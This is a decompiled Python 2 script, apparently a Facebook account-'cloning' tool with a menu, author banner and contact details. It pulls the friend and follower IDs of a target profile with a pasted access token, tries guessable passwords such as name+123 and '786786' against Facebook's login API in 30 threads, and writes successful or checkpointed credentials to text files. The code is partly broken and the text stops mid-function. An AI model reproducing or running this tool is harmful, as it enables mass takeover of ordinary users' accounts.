# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Bitch.py')
    os.system('clear')
    
    os.system('rm -rf .txt')
for n in range(5000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c = '\x1b[1;92m'
c2 = '\x1b[0;97m'
c3 = '\x1b[1;91m'
logo = '\n\n   \x1b[1;92m #######     ###    ########  #### ########  \n   \x1b[1;92m##     ##   ## ##   ##     ##  ##  ##     ## \n   \x1b[1;96m##     ##  ##   ##  ##     ##  ##  ##     ## \n   \x1b[1;93m##     ## ##     ## ##     ##  ##  ########  \n   \x1b[1;96m##  ## ## ######### ##     ##  ##  ##   ##   \n   \x1b[1;97m##    ##  ##     ## ##     ##  ##  ##    ##  \n   \x1b[1;93m ##### ## ##     ## ########  #### ##     ## \n                                            \n\x1b[1;92m------------------------------------------------------\n\n\x1b[1;93m(!)\x1b[1;92m Author   : ABDUL QADIR\n\x1b[1;93m(!)\x1b[1;92m WhatsApp : 03030242755\n\x1b[1;93m(!)\x1b[1;92m Github   : https://github.com/Qadirking\n\x1b[1;93m(!)\x1b[1;92m Facebook : https://www.facebook.com/Abdul.X.786\n\n\x1b[1;92m------------------------------------------------------\n'

def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mLoa\x1b[1;93mding\x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def main():
    os.system('clear')
    print logo
    print ''
    print ('    \x1b[1;93m[ main menu ]').center(50)
    print '\x1b[1;93m\n-----------------------------------------------------\n'
    print '\x1b[1;93m [1]\x1b[1;92m [START CLONING]'
    print ''
    print '\x1b[1;93m [2]\x1b[1;92m [START RANDOM CLONING]'
    print ''
    print '\x1b[1;93m [3]\x1b[1;92m [START CLONING CHOICE PASS ]'
    print ''
    print '\x1b[1;93m [4]\x1b[1;92m [FILE CLONING]'
    print ''
    print '\x1b[1;93m [5]\x1b[1;92m [CREATE FILE]'
    print ''
    print '\x1b[1;93m [0]\x1b[1;91m [EXIT]'
    print '\x1b[1;93m\n-----------------------------------------------------\n'
    main_select()


def main_select():
    Qm = raw_input('\x1b[1;93mChoose Opition : \033[1;0m ')
    if Qm == '1':
        login_ahs()
    elif Qm == '2':
        action()
    elif Qm == '3':
        ch_pass()
    elif Qm == '4':
        file_clone()
    elif Qm == '5':
        file_ex()
    elif Qm == '0':
        os.system('exit')
    else:
        print ('[!] Please select a valid option').center(50)
        time.sleep(2)
        main()


def login_ahs():
    try:
        token = open("access_token.txt", "r").read()
        menu_qais()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        print(47*"-")
        token = raw_input      (" Paste token here: ")
        print(47*"-")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        menu_qais()  
def menu_qais():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("\tToken not found ")
        print ''
        print logo
        print '\x1b[1;93m-----------------------------------------------------'
        print ''
        print '\x1b[1;93m[1]\x1b[1;92m [Crack From Public id Friend list]'
        print ''
        print '\x1b[1;93m[2]\x1b[1;92m [Crack From Public id Followers]'
        print ''
        print '\x1b[1;93m[0]\x1b[1;91m [BACK]'
        print ''
        print '\x1b[1;93m-----------------------------------------------------'
        print ''
        qaiser_select()


def qaiser_select():
    select = raw_input('\x1b[1;93mChoose Option :\x1b[1;92m ')
    id = []
    oks = []
    cps = []
    
    if select == '1':
        os.system('clear')
        print logo
        print ''
        idt = raw_input('\x1b[1;93m[!] Put ID Link :\x1b[1;92m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            print '\x1b[1;93m Target from : \x1b[1;92m' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91myour login account has checkpoint').center(50)
            print ''
            menu_qais()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '=' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print ''
        idt = raw_input('\x1b[1;93m[!] Put ID Link :\x1b[1;92m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' \x1b[1;93mTarget from : \x1b[1;92m' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91m login id has checkpoint').center(50)
            print ''
            time.sleep(3)
            menu_qais()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '=' + nm)

    elif select == '0':
        exit()
    else:
        print ''
        print ('Please Select A Valid Option').center(50)
        time.sleep(2)
        qaiser_select()
    print '\x1b[1;93m Total IDs : \x1b[1;92m' + str(len(id))
    print '\x1b[1;93m Process has been started'
    print '\x1b[1;93m Plzz wait to Crack idzz'
    time.sleep(0.5)
    print ''
    print 54 * '\x1b[1;92m-'
    print ('\x1b[1;92m    [ 5 SECOND TURN ON AIRPLANE MODE AND TURN OFF]').center(50)
    print 54 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('=')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[Qadir-OK] ' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('ok.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786786'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '223344'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[Qadir-OK] ' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = 'pakistan'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '\x1b[0;92m-'
    print '\x1b[0;92mProcess Has Been Completed'
    print '\x1b[0;92mTotal CP/OK: ' + str(len(cps)) + '/' + str(len(oks))
    print 47 * '-'
    raw_input('\x1b[0;93mPress enter to Back')
    menu_qais()

def ch_pass():
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        print(47*"-")
        token = raw_input      (" Paste token here: ")
        print(47*"-")
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        menu()  
def menu():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("\tToken not found ")
        print ''
        print logo
        print ''
        print '\x1b[1;93m-----------------------------------------------------'
        print ''
        print '\x1b[1;93m[1]\x1b[1;92m [Crack From Public id Friend list]'
        print ''
        print '\x1b[1;93m[2]\x1b[1;92m [Crack From Public id Followers]'
        print ''
        print '\x1b[1;93m[0]\x1b[1;91m [Exit]'
        print ''
        print '\x1b[1;93m-----------------------------------------------------'
        print ''   
        menu_select()


def menu_select():
    select = raw_input('\x1b[1;93mChoose Option :\x1b[1;92m ')
    id = []
    oks = []
    cps = []
    if select == '0':
    	exit()
    elif select == '1':
        os.system('clear')
        print logo
        print'======================================'
        print'\n\033[1;92m NAME + PASS \033[1;0m(\033[1;93m DONT TYPE NAME JUST TYPE PASS \033[1;0m ) \n\033[0;32m PASS WILL AUTOMATICALLY CONNECT TO NAME \033[1;0m\n '
        au1 = raw_input("\n\t1 Pass : ")
        au2 = raw_input("\t2 Pass : ")
        au3 = raw_input("\t3 Pass : ")
        au4 = raw_input("\t4 Pass : ")
        print'\n======================================'
        print'\n\033[1;93m DIGIT PASS \033[1;0m(\033[0;31m TYPE ANY PASS YOU WANT\033[1;0m ) \n\033[1;92m EX : pakistan , 786786 , 112233 , 102030 , 786110 etc \033[1;0m\n '
        au5 = raw_input("\n\t1 Pass : ")
        au6 = raw_input("\t2 Pass : ")
        au7 = raw_input("\t3 Pass : ")
        au8 = raw_input("\t4 Pass : ")
        print'\n======================================'
        print ''
        idt = raw_input('\x1b[1;93m[!] Put ID Link :\x1b[1;92m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            print '\x1b[1;93m Target from : \x1b[1;92m' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91myour login account has checkpoint').center(50)
            print ''
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '=' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print ''
        print ''
        idt = raw_input('\x1b[1;93m[!] Put ID Link :\x1b[1;92m ')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' \x1b[1;93mTarget from : \x1b[1;92m' + q['name']
        except (KeyError, IOError):
            print ''
            print ('\x1b[1;91m login id has checkpoint').center(50)
            print ''
            time.sleep(3)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '=' + nm)

    else:
        print ''
        print ('Please Select A Valid Option').center(50)
        time.sleep(2)
        menu_select()
    print '\x1b[1;93m Total IDs : \x1b[1;92m' + str(len(id))
    print '\x1b[1;93m Process has been started'
    print '\x1b[1;93m Plzz wait to Crack idzz'
    time.sleep(0.5)
    print ''
    print 54 * '\x1b[1;92m-'
    print ('\x1b[1;92m    [ 5 SECOND TURN ON AIRPLANE MODE AND TURN OFF]').center(50)
    print 54 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('=')
        try:
            pass1 = name + au1
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass1 + ' | ' + name
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[Qadir-OK] ' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + au2
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + au3
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('ok.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + au4
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = au5
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = au6
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[Qadir-OK] ' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = au7
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)    
                                  # else:
                                        #pass8 = au8
                                       # q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                        #d = json.loads(q)
                                      ########### # if 'www.facebook.com' in d['error_msg']:
                                          ###### # print '\x1b[1;93m[Qadir-Cp] ' + uid + ' | ' + pass8 + ' | ' + name
                                         #####   cp = open('cp.txt', 'a')
                                            ####cp.write(uid + ' | ' + pass8 + '\n')
                                          #####  cp.close()
                                           ##### cps.append(uid)
                                       ##### elif 'access_token' in d:
                                           #### print '\x1b[1;92m[Qadir-Ok] ' + uid + ' | ' + pass8 + '\x1b[1;0m'
                                            ####ok = open('ok.txt', 'a')
                                           #### ok.write(uid + ' | ' + pass8 + '\n')
                                           ###  ok.close()
                                          #  oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '\x1b[0;92m-'
    print '\x1b[0;92mProcess Has Been Completed'
    print '\x1b[0;92mTotal CP/OK: ' + str(len(cps)) + '/' + str(len(oks))
    print 47 * '-'
    raw_input('\x1b[0;93mPress enter to Back')
    menu()
    
def action():
	os.system(' python2 Boss.py')
	
def file_clone():
    os.system("clear")
    print(logo)
    print("")
    print("\t    \033[1;32mAUTO PASS FILE CRACK\033[0;97m")
    print("")
    try:
			filelist = raw_input("[+] File : ")
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;31mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			crack()
	print'======================================'
    print'\n\033[1;92m NAME + PASS \033[1;0m(\033[1;93m DONT TYPE NAME JUST TYPE PASS \033[1;0m ) \n\033[0;32m PASS WILL AUTOMATICALLY CONNECT TO NAME \033[1;0m\n '
    au1 = raw_input("\n\t1 Pass : ")
    au2 = raw_input("\t2 Pass : ")
    au3 = raw_input("\t3 Pass : ")
    au4 = raw_input("\t4 Pass : ")
    print'\n======================================'
    print'\n\033[1;93m DIGIT PASS \033[1;0m(\033[0;31m TYPE ANY PASS YOU WANT\033[1;0m ) \n\033[1;92m EX : pakistan , 786786 , 112233 , 102030 , 786110 etc \033[1;0m\n '
    au5 = raw_input("\n\t1 Pass : ")
    au6 = raw_input("\t2 Pass : ")
    au7 = raw_input("\t3 Pass : ")
    print'\n======================================'
	print(" Total IDs : "+str(len(id)))
	print(" The Process has started")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			pass1 = "Pakistan"
			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
			q = json.loads(data)
			if "loc" in q:
				print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass1+"\033[0;97m")
				ok = open("/sdcard/ids/checkpoint.txt", "a")
				ok.write(uid+" | "+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error"]:
					print("[Checkpoint] "+uid+" | "+pass1)
					cp = open("checkpoint.txt","a")
					cp.write(uid+" | "+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name+"123"
					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
					q = json.loads(data)
					if "loc" in q:
						print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("/sdcard/ids/checkpoint.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error"]:
							print("[Checkpoint] "+uid+" | "+pass2)
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name+"1234"
							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
							q = json.loads(data)
							if "loc" in q:
								print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("/sdcard/ids/checkpoint.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error"]:
									print("[Checkpoint] "+uid+" | "+pass3)
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name+"12345"
									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
									q = json.loads(data)
									if "loc" in q:
										print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("/sdcard/ids/checkpoint.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error"]:
											print("[Checkpoint] "+uid+" | "+pass4)
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
											cps.apppend(uid+pass4)
										else:
											pass5 = name+"786"
											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
											q = json.loads(data)
											if "loc" in q:
												print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass5+"\033[0;97m")
												ok = open("/sdcard/ids/checkpoint.txt", "a")
												ok.write(uid+" | "+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error"]:
													print("[Checkpoint] "+uid+" | "+pass5)
													cp = open("checkpoint.txt","a")
													cp.write(uid+" | "+pass5+"\n")
													cp.close()
													cps.append(uid+pass6)
												else:
													pass6 = "000786"
													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
													q = json.loads(data)
													if "loc" in q:
														print("\033[1;37m[Checkpoint] \033[1;37m"+uid+" | "+pass6+"\033[0;97m")
														ok = open("/sdcard/ids/checkpoint.txt", "a")
														ok.write(uid+" | "+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error"]:
															print("[Checkpoint] "+uid+" | "+pass6)
															cp = open("checkpoint.txt","a")
															cp.write(uid+" | "+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = "786786"
															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
															q = json.loads(data)
															if "loc" in q:
																print("\033[1;37m[Checkpoint] \033[1;30m"+uid+" | "+pass7+"\033[0;97m")
																ok = open("/sdcard/ids/checkpoint.txt", "a")
																ok.write(uid+" | "+pass7+"\n")
